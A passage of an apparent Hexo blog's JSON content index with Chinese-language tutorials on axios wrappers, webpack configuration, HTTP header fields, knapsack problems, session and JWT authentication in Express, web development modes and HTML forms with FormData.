if(response.data.message)ElMessage.success(response.data.message) return Promise.resolve(response); &#125; else &#123; ElMessage.error(response.data.message); return Promise.reject(response); &#125; &#125;,(error)=&gt;&#123; console.log(error); //响应错误 if(error.response&amp;&amp;error.response.status)&#123; return Promise.reject(error) &#125; return Promise.reject(error);&#125;)export default instance; request.jsrequest.js中使用axios实例 12345678910111213141516171819202122232425262728import instance from &quot;./index&quot;const axios=(&#123; method, url, data, config&#125;)=&gt;&#123; method=method.toLowerCase(); if(method==&#x27;post&#x27;)&#123; return instance.post(url,data,&#123;...config&#125;) &#125;else if(method==&#x27;get&#x27;)&#123; return instance.get(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;delete&#x27;)&#123; return instance.delete(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;put&#x27;)&#123; return instance.put(url,data,&#123;...config&#125;) &#125;else&#123; console.log(&#x27;未知的方法&#x27;+method) return false &#125;&#125;export default axios api.jsapi.js用来封装各种类型的请求 默认情况下，axios 将 JavaScript 对象序列化为JSON. 要改为以格式发送数据application/x-www-form-urlencoded，我用的是qs.stringfy将数据转换，其他方法可以参考官网 []: https://axios-http.com/docs/urlencoded 1234567891011121314151617181920212223242526272829303132333435363738import axios from &quot;./request&quot;import qs from &quot;qs&quot;export const login=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/login&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data), &#125;)&#125;export const register=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/register&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;export const logout=()=&gt;&#123; return axios(&#123; url:&#x27;/api/logout&#x27;, method:&#x27;post&#x27;, &#125;)&#125;export const getUserInfo=()=&gt;&#123; return axios(&#123; url:&#x27;/my/getUserInfo&#x27;, method:&#x27;get&#x27;, &#125;)&#125;export const updatePassword=(data)=&gt;&#123; return axios(&#123; url:&#x27;/my/updatePassword&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"}],"tags":[]},{"title":"打包资源","slug":"打包资源","date":"2022-04-10T09:30:58.000Z","updated":"2022-04-11T06:50:45.747Z","comments":true,"path":"2022/04/10/打包资源/","link":"","permalink":"https://coloey.github.io/2022/04/10/%E6%89%93%E5%8C%85%E8%B5%84%E6%BA%90/","excerpt":"","text":"打包样式资源1234567891011121314151617181920212223242526272829303132333435363738394041const &#123;resolve&#125; =require(&#x27;path&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ ], mode:&#x27;development&#x27;&#125; 打包html资源12345678910111213141516171819202122232425262728293031323334353637383940414243444546const &#123;resolve&#125; =require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&#x27;html-webpack-plugin&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ //html-webpack-plugin默认会创建一个空的HTML,自动引入打包输出的所有资源（js/css） //需求：需要有结构的HTML文件 new HtmlWebpackPlugin(&#123; //模板比对&#x27;src/index.html&#x27;文件，并自动引入打包输出的所有资源(js/css) template:&#x27;./src/index.html&#x27; &#125;) ], mode:&#x27;development&#x27;&#125; 打包图片 html-loader 以相同的方式处理 &lt;img src=&quot;./my-image.png&quot; /&gt;。需要npm i html-wepack-plugin []: https://webpack.docschina.org/loaders/html-loader 12345678910111213141516//处理图片 &#123; test:/\\.(png|svg|jpg|jpeg|gif)$/i, type:&#x27;asset/resource&#x27;, &#125;, //将html导出为字符串 &#123; test:/\\.html$/i, loader:&quot;html-loader&quot;, &#125;, //处理字体 &#123; test:/\\.(woff|woff2|eot|ttf|otf)$/i, type:&#x27;asset/resource&#x27; &#125;, 打包xml,csv文件可以加载的有用资源还有数据，如 JSON 文件，CSV、TSV 和 XML。类似于 NodeJS，JSON 支持实际上是内置的，也就是说 import Data from &#39;./data.json&#39; 默认将正常运行。要导入 CSV、TSV 和 XML，你可以使用 csv-loader 和 xml-loader。让我们处理加载这三类文件： 1npm install --save-dev csv-loader xml-loader 12345678&#123; test: /\\.(csv|tsv)$/i, use: [&#x27;csv-loader&#x27;], &#125;, &#123; test: /\\.xml$/i, use: [&#x27;xml-loader&#x27;], &#125;, 打包toml,yaml,json5通过使用 自定义 parser 替代特定的 webpack loader，可以将任何 toml、yaml 或 json5 文件作为 JSON 模块导入。 1npm install toml yamljs json5 --save-dev 12345678910111213141516171819202122232425 const toml=require(&#x27;toml&#x27;)const yaml=require(&#x27;yamljs&#x27;)const json5=require(&#x27;json5&#x27;)...&#123; test: /\\.toml$/i, type: &#x27;json&#x27;, parser: &#123; parse: toml.parse, &#125;, &#125;, &#123; test: /\\.yaml$/i, type: &#x27;json&#x27;, parser: &#123; parse: yaml.parse, &#125;, &#125;, &#123; test: /\\.json5$/i, type: &#x27;json&#x27;, parser: &#123; parse: json5.parse, &#125;, &#125;, 清理/dist文件在每次构建前清理 /dist 文件夹，这样只会生成用到的文件。让我们使用 output.clean 配置项实现这个需求。 12345678910111213141516171819const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Output Management&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;),+ clean: true, &#125;, &#125;;","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"wepack五个核心概念","slug":"wepack五个核心概念","date":"2022-04-10T04:05:22.000Z","updated":"2022-04-10T09:32:42.293Z","comments":true,"path":"2022/04/10/wepack五个核心概念/","link":"","permalink":"https://coloey.github.io/2022/04/10/wepack%E4%BA%94%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/","excerpt":"","text":"Entry:入口（Entry)指示Webpack以哪个文件为入口起点开始打包 Output: 输出（output)指示Webpack打包后的资源bundle输出到哪里，以及如何命名 Loader:Loader让Webpack能够去处理那些非JavaScript文件（webpack自身只理解JavaScript) loader 用于对模块的源代码进行转换。loader 可以使你在 import 或”加载”模块时预处理文件。因此，loader 类似于其他构建工具中“任务(task)”，并提供了处理前端构建步骤的强大方法。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 import CSS文件！ Plugins:插件(Plugins)可以用于执行范围更广的任务，插件的范围包括从打包优化到压缩，一直到重新定义环境中的变量等 Mode:模式（Mode）指示Webpack使用相应模式的配置 选项 描述 特点 development 会将process.env.NODE_ENV的值设为development,启用NamedChunksPlugin和NamedModulesPlugin 能让代码在本地调试运行的环境 production 会将 process.env.NODE_ENV 的值设为 production。启用 FlagDependencyUsagePlugin, FlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurrenceOrderPlugin, SideEffectsFlagPlugin 和 UglifyJsPlugin 能让代码优化上线运行的环境 运行指令开发环境webpack ./src/index.js -o ./build/build.js –mode=development:webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是开发环境 生成环境webpack ./src/index.js-o ./build/build.js –mode=production,webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是生产环境 结论 webpack能处理js/json资源，不能处理css/img等其他资源 生产环境和开发环境将ES6模块化编译成浏览器能识别的模块化 生产环境比开发环境多一个压缩的js代码","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"HTTP首部字段","slug":"HTTP通用首部字段","date":"2022-04-09T08:13:43.000Z","updated":"2022-04-11T13:35:32.923Z","comments":true,"path":"2022/04/09/HTTP通用首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/09/HTTP%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"HTTP报文首部HTTP请求报文由请求行（方法，URI，HTTP版本），HTTP首部字段等部分构成。 HTTP响应报文由状态行（HTTP版本，状态码（数字和原因短语））HTTP首部字段3部分构成。 4种HTTP首部字段类型通用首部字段：请求报文和响应报文都会使用的首部 请求首部字段：从客户端向服务端发送报文时使用的首部，补充了请求的附加内容，客户端信息，响应内容相关优先级等信息 响应首部字段：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息 实体首部字段：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息 HTTP/1.1通用首部字段Cache-Control通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。 Cache-Control:private,max-age=0,no-cache 缓存请求指令： 指令 参数 说明 no-cache 无 强制向源服务器再次验证 no-store 无 不缓存请求或响应的任何内容 max-age=([秒]) 必需 响应的最大Age值 max-stale=([秒]) 可省略 接收已过期的响应 min-fresh=[秒] 必需 期望在指定时间内的响应仍有效 no-transform 无 代理不接更改媒体类型 only-if-cached 无 从缓存中获取资源 cache-extension 新指令标记（token) 缓存响应指令 指令 参数 说明 public 无 可向任意方提供响应的缓存 private 可省略 仅向特定用户返回响应 no-cache 可省略 缓存前必须先确认其有效性 no-store 无 不缓存请求或响应的任何内容 no-transform 无 代理不接更改媒体类型 must-revalidate 无 可缓存但必须再向服务器进行确认 proxy-revalidate 无 要求中间缓存服务器对缓存的响应有效性再进行确认 max-age=[秒] 必需 响应的最大Age值 s-maxage=[秒] 必需 公共缓存服务器响应的最大Age值 cache-extension - 新指令标记（token) no-cache指令Cache-Control:no-cache 使用no-cache指令的目的是为了防止从缓存中返回过期的资源，缓存会向源服务器进行有效期的确认后处理资源 客户端：发送的请求中包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是“中间”缓存服务器必须把客户端请求转发给源服务器 服务器：如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存，源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作 Cache-Control:no-cache=Location 由服务器返回的响应中，若报文首部字段Cache-Control中对no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。相反，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数 no-store指令Cache-Control:no-store 当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息，因此该指令规定缓存不能在本地存储请求或响应的任何一部分 s-maxage指令Cache-Control:s-maxage=604800(单位：秒) s-maxage指令的功能和max-age指令相同，不同点在于s-maxage指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。 当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理 max-age指令Cache-Control:max-age=604800(单位：秒) 客户端：当客户端发送的请求中包含max-age指令时，如果判定缓存时间的数值比·1指定时间的数值更小，那么客户端就接收缓存的资源。当指定的max-age=0，那么缓存服务器通常将请求转发给源服务器 服务端：服务器返回的响应中包含max-age指令，缓存服务器将不对资源的有效性再作确认，而max-zge数值代表资源保存为缓存的最长时间 ⚠应用HTTP/1.1版本的缓存服务器在遇到同时存在Expires首部字段的情况时，会优先处理max-age指令,而忽略Expires首部字段，而HTTP/1.0版本的缓存服务器则相反，max-age指令被忽略 min-fresh指令Cache-Control:min-fresh=60 min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。 max-stale指令Cache-Control:max-stale=3600 使用max-stale指示缓存资源，即使过期也照常接收 如果指令未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内仍旧会被客户端接收 only-if-cached指令Cache-Control:only-if-cached 表示客户端仅在缓存服务器本地缓存目标资源的情况下才要求其返回。该指令要求服务器不重新加载响应，也不再次确认资源有效性。若请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout must-revalidate指令Cache-Control:must-revalidate 代理向源服务器再次验证即将返回的响应缓存目前是否仍然有效。如果代理无法连通服务器再次活期有效资源，缓存必须给客户端一条504状态码 使用must-revalidate指令忽略请求的max-stale指令，即使首部使用了max-stale，也不会有效果 proxy-revalidate指令Cache-Control：proxy-revalidate proxy-revalidate要求所有缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform指令Cache-Control：no-transform 无论·是在请求还是响应中使用，缓存都不能改变实体主体的媒体类型，这样可防止代理压缩图片等类似操作 Cache-Control扩展cache-control token Cache-Control:private,community=”UCI” 通过cache-extension标记可以扩展Cache-Control首部字段内的指令。如例子，Cache-Control首部字段本身没有community这个指令。借助extensions tokens实现了该指令的添加。如果缓存服务器无法理解这个新指令就会直接忽略 Connection作用： 控制不再转发给代理的首部字段 管理持久连接 Connection:不再转发的首部字段名 控制不再转发给代理的首部字段在客户端发送请求和服务器返回响应内，使用Connection首部字段，可控制不再转发给代理的首部字段 管理持久连接Connection:close HTTP/1.1版本的默认连接是持久连接，为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，指定Connection首部字段为Close HTTP/1.1之前的版本默认连接是非持久连接。因此，如果想要在旧版本的HTTP协议上维持持续连接，则需要指定Connection为Kepp-Alive PragmaPragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义 Pragma:no-cache 该首部字段属于通用首部字段，但只用在客户端发送请求中。客户端要求所有的中间服务器不返回缓存的资源。所有中间服务器如果都能以HTTP/1.1为基准，那直接采用Cache-Control:no-cache指定缓存的处理方式是最为理想的。但要整体掌握中间服务器使用的HTTP协议版本不现实，发送请求一般同时包含两个首部字段 Cache-Control:no-cache Pragma:no-cache Trailer首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在HTTP/1.1版本分块传输编码时 Trailer:Expires —(报文主体)— Expires:Tue,28 Sep 2004 23:59:59 GMT Transfer-Encoding规定了传输报文主体时采用的编码方式 HTTP/1.1的传输编码方式仅对分块传输编码有效 Upgrade Upgrade用于检测HTTP协议及其他协议是否可使用更高的版本进行同心，其参数值用来指定一个完全不同的通信协议 12345678客户端=》服务器GET/index.html HTTP/1.1Upgrade:TLS/1.0Connection:Upgrade服务器=》客户端HTTP/1.1 101 Switching ProtocolsUpgrade:TLS/1.0,HTTP/1.1Connection:Upgrade Connection的值被指定为Upgrade,Upgrade的首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。因此使用首部字段Upgrade时需要额外指定Connection为Upgrade Via使用Via是为了追踪客户端和服务器之间的请求和响应报文的传输路径 报文经过代理或网关时，会现在首部字段Via中附加该服务器的信息，然后再进行转发。Via不仅用于追踪报文的转发，还可避免请求回环的发生，所以必须在经过代理时附加该首部字段内容 WarningHTTP/1.1的Warning首部是从HTTP/1.0的响应首部（Retry-After)演变过来的，该首部会告知用户一些与缓存相关的问题的警告 &amp;eg: Warning:113 gw.hackr.jp:8080 “Heuristic expiration” Tue,03 Jul=&gt;2012 05:09:44 GMT Warning:【警告码】【警告主机：端口号】“【警告内容】”（【日期时间】） HTTP/1.1警告码 警告码 警告内容 说明 110 Response is stale(响应已过期) 代理返回已过期的资源 111 Revalidation failed(再验证失败) 代理验证资源有效性时失败（服务器无法到达等原因 112 Disconnection operation(断开连接操作) 代理与互联网连接故意切断 113 Heuristic expiration(试探性过期) 响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下） 199 Miscellaneous warning(杂项警告) 任意警告内容 214 Transformation applied(使用了转换) 代理对内容编码或媒体类型等执行了某些处理时 299 Miscellaneous persistent warning(持久杂项警告) 任意警告内容","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://coloey.github.io/categories/HTTP/"}],"tags":[]},{"title":"背包问题","slug":"背包问题","date":"2022-04-04T04:01:42.000Z","updated":"2022-04-08T09:19:01.103Z","comments":true,"path":"2022/04/04/背包问题/","link":"","permalink":"https://coloey.github.io/2022/04/04/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/","excerpt":"","text":"01背包：有限物品数量 二维01背包问题，两个for循环可以交换顺序，内层for循环方向可以顺序循环 一维01背包问题：因为物品数量有限，内层for循环不能重复取，必须倒序，两个for循环可以交换顺序 完全背包问题：物品可以重复取 二维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 一维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 求方法数：dp[j]+=dp[j-nums[i]] 一维：求组合数：先遍历物品再遍历背包 求排列数：先遍历背包再遍历物品","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"前后端身份认证","slug":"前后端身份认证","date":"2022-03-21T06:10:19.000Z","updated":"2022-04-12T09:45:43.489Z","comments":true,"path":"2022/03/21/前后端身份认证/","link":"","permalink":"https://coloey.github.io/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"不同身份认证方案：服务端渲染推荐使用Session认证机制 前后端分离推荐使用JWT认证机制 Session认证机制 Cooike:Cookie是存储在用户浏览器中一段不超过4kb的字符串，它由一个名称（Name),y一个值(Value)和几个用于控制Cookie有效期，安全性，使用范围的可选属性组成 不同域名下的Cookie各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的Cookie一同发送到服务器。 Cookie的几大特性： 自动发送 域名独立 过期时限 4kb限制 Cookie在身份认证中的作用： 客户端第一次请求服务器时，服务器通过响应头的形式，向客户端发送一个身份认证的Cookie，客户端会自动将Cookie保存在浏览器中，随后，当客户端浏览器每次请求服务器时浏览器会自动将身份认证相关的Cookie，通过请求头的形式发送给服务器，服务器即可验证客户端身份 Cookie具有不安全性 由于Cookie是存储在浏览器中的，因此浏览器也提供了读写Cookie的API，因此Cookie很容易被伪造，不具有安全性，因此Cookie不能存放重要隐私数据 Session工作原理： 客户端把用户ID和密码等登陆信息放入报文的实体部分，通常是以POST请求发送给服务器，而这时使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送 服务器会发放用以识别用户的Session ID,通过验证从客户端送过来的登录信息进行身份认证，人后把用户认证状态与Session ID绑定后记录在服务器端，向客户端返回响应时，会在首部字段Set-Cookie内写入Sessin ID,为避免SessionId被盗，可在Cookie中加入httponly属性 客户端接收到从服务器发来的Session ID后，会将其作为Cookie保存哎本地，下次向服务器发送请求时，浏览器自动发送Cookie,服务器通过验证接收到的Session ID识别用户和其认证状态 Session认证需要配合Cookie实现，由于Cookie默认不支持跨域访问，所以当涉及前端跨域请求后端接口时需要做额外配置。因此当前端请求后端接口不涉及跨域请求时推荐使用Session身份认证机制，否则使用JWT认证 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)//var formParser=require(&#x27;express-formidable&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) JWT认证机制：工作原理 jwt组成部分： 头部.有效荷载.签名 Header.PayLoad.Signature 客户端收到服务器返回的JWT后，通常会将它存储在localStorage或者sessionStorage中，此后客户端每次与服务端通信，都要带上这个JWT的字符串，进行身份认证，推荐把JWT放在Http请求头的Authorization字段中 Authorization：Bearer 在Express中使用JWT 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const express=require(&#x27;express&#x27;);const app=express();const cors=require(&#x27;cors&#x27;);//导入用于生成jwt字符串的包const jwt=require(&#x27;jsonwebtoken&#x27;);//导入用于将客户端发送过来的JWT字符串解析还原成JSON对象的包const expressJWT=require(&quot;express-jwt&quot;);//秘钥的本质是字符串const secretkey=&#x27;xiaochunzuishuai^_^&#x27;;//以/api/开头的不用权限，配置成功了express-jwt这个中间件，就可以把解析出来的用户信息挂载到req.user上app.use(expressJWT(&#123; secret:secretkey, algorithms: [&#x27;HS256&#x27;], &#125;).unless(&#123;path:[/^\\/api\\//]&#125;))const bodyParser=require(&#x27;body-parser&#x27;)app.use(cors());//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 const userInfo=req.body; if(userInfo.username!==&quot;admin&quot;||userInfo.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功生成JWT字符串，通过token属性响应给客户端 res.send(&#123; satus:0, msg:&#x27;success&#x27;, //不要把密码加密到token字符串中 token:jwt.sign(&#123;username:userInfo.username&#125;,secretkey,&#123;expiresIn:&#x27;100s&#x27;&#125;), data:req.user &#125;)&#125;)//有权限的接口,配置成功了express-jwt这个中间件，有权限的接口就可以通过req.user获取解析出来的用户信息app.get(&#x27;/admin/getInfo&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;success&#x27;, data:req.user &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)//配置全局错误处理中间件app.use((err,req,res,next)=&gt;&#123; //token解析失败导致的错误,Token过期或不合法 if(err.name===&#x27;UnauthorizedError&#x27;)&#123; return res.send(&#123;status:401,message:&#x27;无效的token&#x27;&#125;) &#125; //其他原因导致的错误 res.send(&#123;status:500,message:&#x27;未知错误&#x27;&#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Web开发模式","slug":"Web开发模式","date":"2022-03-21T05:52:34.000Z","updated":"2022-03-21T06:09:19.188Z","comments":true,"path":"2022/03/21/Web开发模式/","link":"","permalink":"https://coloey.github.io/2022/03/21/Web%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"Web开发模式：服务端渲染的Web开发模式服务器发送给客户端的HTML页面是通在服务器通过字符串的拼接动态生成的。因此客户端不需要通过Ajax技术额外请求页面的数据 优点： 前端耗时少，因为服务端通过动态生成HTML内容，浏览器只需要直接渲染页面即可，尤其是移动端，更省电 有利于SEO，服务器响应的是完整的HTML页面，所以爬虫更容易获取信息，有利于SEO 缺点： 占用服务器资源，如果请求较多，会对服务器造成一定压力 不利于前后端分离，开发效率低。使用服务端渲染，则无法进行分工合作，尤其对于前端复杂的项目，不利于羡慕高效开发 前后端分离的Web开发模式：依赖于Ajax技术，后端负责接口开发，前端使用Ajav=x调用接口的开发模式 优点： 开发体验好，前端专注于UI开发，后端专注于接口开发 用户体验好，Ajax技术的应用，提高用户的体验，轻松实现局部页面刷新 减轻服务端的渲染压力，页面最终是在浏览器中生成的 缺点： 不利于SEO，完整的HTML页面需要在客户端动态拼接，所有爬虫无法提取页面有效信息，解决方法：利用Vue,React等前端框架的SSR技术解决 如何选择Web开发模式： 看业务场景 主要功能是展示页面且没有复杂交互并且需要良好的SEO，用服务端渲染 后台管理项目等交互性强用前后端分离 一般两者都会一起用","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"FormData","slug":"FormData","date":"2022-03-21T03:13:21.000Z","updated":"2022-03-21T03:14:47.585Z","comments":true,"path":"2022/03/21/FormData/","link":"","permalink":"https://coloey.github.io/2022/03/21/FormData/","excerpt":"","text":"表单，FormData 对象目录 [隐藏] 表单概述 FormData 对象 概述 实例方法 表单的内置验证 自动校验 checkValidity() willValidate 属性 validationMessage 属性 setCustomValidity() validity 属性 表单的 novalidate 属性 enctype 属性 文件上传 参考链接 表单概述表单（&lt;form&gt;）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。 12345678910111213&lt;form action=&quot;/handling-page&quot; method=&quot;post&quot;&gt; &lt;div&gt; &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;user_name&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;passwd&quot;&gt;密码：&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;user_passwd&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;提交&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。 用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的name属性，键值是控件的value属性，键名和键值之间由等号连接。比如，用户名输入框的name属性是user_name，value属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对user_name=张三。 所有的键值对都会提交到服务器。但是，提交的数据格式跟&lt;form&gt;元素的method属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 GET 请求的 HTTP 头信息。 12GET /handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交Host: example.com 如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 POST 请求的头信息。 123456POST /handling-page HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedContent-Length: 74user_name=张三&amp;user_passwd=123&amp;submit_button=提交 注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。 点击submit控件，就可以提交表单。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 上面表单就包含一个submit控件，点击这个控件，浏览器就会把表单数据向服务器提交。 注意，表单里面的&lt;button&gt;元素如果没有用type属性指定类型，那么默认就是submit控件。 123&lt;form&gt; &lt;button&gt;提交&lt;/button&gt;&lt;/form&gt; 上面表单的&lt;button&gt;元素，点击以后也会提交表单。 除了点击submit控件提交表单，还可以用表单元素的submit()方法，通过脚本提交表单。 1formElement.submit(); 表单元素的reset()方法可以重置所有控件的值（重置为默认值）。 1formElement.reset() FormData 对象概述表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。 FormData()首先是一个构造函数，用来生成表单的实例。 1var formdata = new FormData(form); 